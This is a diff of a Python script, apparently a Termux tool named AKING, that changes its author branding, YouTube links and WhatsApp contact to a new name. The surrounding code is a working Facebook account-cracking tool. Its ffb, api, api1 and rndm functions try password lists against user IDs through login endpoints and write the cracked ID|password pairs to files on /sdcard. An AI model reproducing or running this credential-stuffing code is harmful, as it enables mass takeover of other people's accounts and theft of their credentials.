@@ -1,6 +1,6 @@
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open https://youtube.com/@princehamzayt6210/')
+os.system('xdg-open https://youtube.com/@iamali550/')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 
 #####################    
@@ -66,19 +66,19 @@ for agent in range(10000):
         ugen.append(fullagnt)
 logo=("""\x1b[1;92m
 
- ██████  ██████  ██ ███    ██  ██████ ███████ 
- ██   ██ ██   ██ ██ ████   ██ ██      ██      
- ██████  ██████  ██ ██ ██  ██ ██      █████   
- ██      ██   ██ ██ ██  ██ ██ ██      ██      
- ██      ██   ██ ██ ██   ████  ██████ ███████ 
+ _    _     ___      _    _   _ __  __ _____ ____
+   / \  | |   |_ _|    / \  | | | |  \/  | ____|  _ \
+  / _ \ | |    | |    / _ \ | |_| | |\/| |  _| | | | |
+ / ___ \| |___ | |   / ___ \|  _  | |  | | |___| |_| |
+/_/   \_\_____|___| /_/   \_\_| |_|_|  |_|_____|____/
 ╔══════════════════════════════════════╗
-║        WELCOME TO PRINCE COMMAND     ║     
+║        WELCOME TO Ali AHMED COMMAND     ║     
 ╚══════════════════════════════════════╝                                     
 ╔══════════════════════════════════════╗
-║\033[1;97m[+] DEVOLPER   : PrinceHamzaYT        ║
-║\033[1;97m[+] FACEBOOK   : PrinceHamzaYT        ║
-║\033[1;97m[+] WHATSAPP   : 03240191630          ║
-║\033[1;97m[+] GITHUB     : PrinceHamzaYT        ║
+║\033[1;97m[+] DEVOLPER   : Ali Ahmed        ║
+║\033[1;97m[+] FACEBOOK   : Ali Ahmed        ║
+║\033[1;97m[+] WHATSAPP   : 03447546634          ║
+║\033[1;97m[+] GITHUB     : Ali Ahmed        ║
 ║\033[1;97m[+] VERTION    : 1.0                  ║
 ╚══════════════════════════════════════╝""")
 def linex():
@@ -314,11 +314,11 @@ def menu():
                                 gmail()
                         elif xd in ['6','06']:
                                 wx=('Fn69MPxmUv0GBf6MtEvL6G')
-                                os.system(f'xdg-open https://youtube.com/@princehamzayt6210/{wx}');menu()
+                                os.system(f'xdg-open https://youtube.com/@iamali550/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open https://youtube.com/@princehamzayt6210');menu()
+                                os.system('xdg-open https://youtube.com/@iamali550');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://youtube.com/@princehamzayt6210');menu()
+                                os.system('xdg-open https://youtube.com/@iamali550');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -337,10 +337,10 @@ def menu():
                         linex()
                         print(" Your Subscription Date Expire")
                         linex()
-                        url_wa = "https://api.whatsapp.com/send?phone=+923240191630 I &text="
+                        url_wa = "https://api.whatsapp.com/send?phone=+923447546634 I &text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi ZAMAN & NIHAL Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi Ali Ahmed, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                         print(' Run :  python AKING.py')
                         exit()
@@ -466,7 +466,7 @@ def gmail():
                 os.system('python AKING.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [Prince-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Ali-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -487,14 +487,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [Prince-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/Prince-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [Ali-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/Ali-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[1;93m [Prince-CP] '+ids+' | '+pas+'\x1b[1;93m')
-                                        open('/sdcard/Prince-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;93m [Ali-CP] '+ids+' | '+pas+'\x1b[1;93m')
+                                        open('/sdcard/Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -508,7 +508,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [Prince-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Ali-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -558,14 +558,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [Prince-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Prince-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [Ali-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Ali-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;93m [Prince-CP] '+ids+' | '+pas+'\x1b[1;93m')
-                                                open('/sdcard/Prince-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;93m [Ali-CP] '+ids+' | '+pas+'\x1b[1;93m')
+                                                open('/sdcard/Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -628,18 +628,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [Prince-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Prince-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [Ali-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Ali-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;93m [Prince-CP] '+ids+' | '+pas+'\x1b[1;93m')
-                                                open('/sdcard/Prince-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;93m [Ali-CP] '+ids+' | '+pas+'\x1b[1;93m')
+                                                open('/sdcard/Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/Prince-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Ali-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -702,16 +702,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/Prince-OK.txt','r').read()
+                                                okk=open('/sdcard/Ali-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [Prince-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/Prince-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [Ali-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/Ali-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [Prince-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Prince-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [Ali-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Ali-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
